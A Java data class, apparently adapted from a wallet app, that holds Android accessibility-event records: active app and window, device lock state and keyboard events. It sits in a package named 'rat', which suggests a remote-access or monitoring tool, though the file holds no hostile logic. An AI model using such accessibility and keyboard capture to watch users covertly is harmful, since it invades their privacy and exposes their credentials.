package com.vendor.rat.data.stat;

import androidx.annotation.NonNull;

// ADAPT: vendor com.guard.wallet.stat.AccessibilityEventStatVO extends MessageBodyVO
// We skip MessageBodyVO base class for now
// ADAPT: vendor field UiObjectVO source — not yet replicated, using Object placeholder
public class AccessibilityEventStatVO {
    private String activePackageName;
    private String activeWindowClassName;
    private String containerCode;
    private String eventClassName;
    private String eventPackageName;
    private long eventTime;
    private int eventValue;
    private Integer isDeviceLocked;
    private Integer isDeviceSecure;
    private KeyboardEventVO keyboardEvent;
    private Object source; // TODO: VENDOR_VERIFY — vendor uses UiObjectVO

    public AccessibilityEventStatVO() {
        this.eventTime = System.currentTimeMillis();
    }

    public AccessibilityEventStatVO(String containerCode, String activePackageName,
                                     String activeWindowClassName, String eventPackageName,
                                     String eventClassName, int eventValue, long eventTime,
                                     Integer isDeviceLocked, Integer isDeviceSecure,
                                     KeyboardEventVO keyboardEvent, Object source) {
        System.currentTimeMillis();
        this.containerCode = containerCode;
        this.activeWindowClassName = activeWindowClassName;
        this.activePackageName = activePackageName;
        this.eventPackageName = eventPackageName;
        this.eventClassName = eventClassName;
        this.eventValue = eventValue;
        this.eventTime = eventTime;
        this.isDeviceLocked = isDeviceLocked;
        this.isDeviceSecure = isDeviceSecure;
        this.keyboardEvent = keyboardEvent;
        this.source = source;
    }

    public String getActivePackageName() {
        return this.activePackageName;
    }

    public String getActiveWindowClassName() {
        return this.activeWindowClassName;
    }

    public String getContainerCode() {
        return this.containerCode;
    }

    public String getEventClassName() {
        return this.eventClassName;
    }

    public String getEventPackageName() {
        return this.eventPackageName;
    }

    public long getEventTime() {
        return this.eventTime;
    }

    public int getEventValue() {
        return this.eventValue;
    }

    public Integer getIsDeviceLocked() {
        return this.isDeviceLocked;
    }

    public Integer getIsDeviceSecure() {
        return this.isDeviceSecure;
    }

    public KeyboardEventVO getKeyboardEvent() {
        return this.keyboardEvent;
    }

    public Object getSource() {
        return this.source;
    }

    public void setActivePackageName(String activePackageName) {
        this.activePackageName = activePackageName;
    }

    public void setActiveWindowClassName(String activeWindowClassName) {
        this.activeWindowClassName = activeWindowClassName;
    }

    public void setContainerCode(String containerCode) {
        this.containerCode = containerCode;
    }

    public void setEventClassName(String eventClassName) {
        this.eventClassName = eventClassName;
    }

    public void setEventPackageName(String eventPackageName) {
        this.eventPackageName = eventPackageName;
    }

    public void setEventTime(long eventTime) {
        this.eventTime = eventTime;
    }

    public void setEventValue(int eventValue) {
        this.eventValue = eventValue;
    }

    public void setIsDeviceLocked(Integer isDeviceLocked) {
        this.isDeviceLocked = isDeviceLocked;
    }

    public void setIsDeviceSecure(Integer isDeviceSecure) {
        this.isDeviceSecure = isDeviceSecure;
    }

    public void setKeyboardEvent(KeyboardEventVO keyboardEvent) {
        this.keyboardEvent = keyboardEvent;
    }

    public void setSource(Object source) {
        this.source = source;
    }

    @NonNull
    public String toString() {
        return "AccessibilityEventStat{activePackageName='" + this.activePackageName
                + "', activeWindowClassName='" + this.activeWindowClassName
                + "', eventPackageName='" + this.eventPackageName
                + "', eventClassName='" + this.eventClassName
                + "', eventValue=" + this.eventValue
                + ", eventTime=" + this.eventTime
                + ", isDeviceLocked=" + this.isDeviceLocked
                + ", isDeviceSecure=" + this.isDeviceSecure
                + ", containerCode=" + this.containerCode
                + ", keyboardEvent=" + this.keyboardEvent
                + ", source=" + this.source + '}';
    }
}
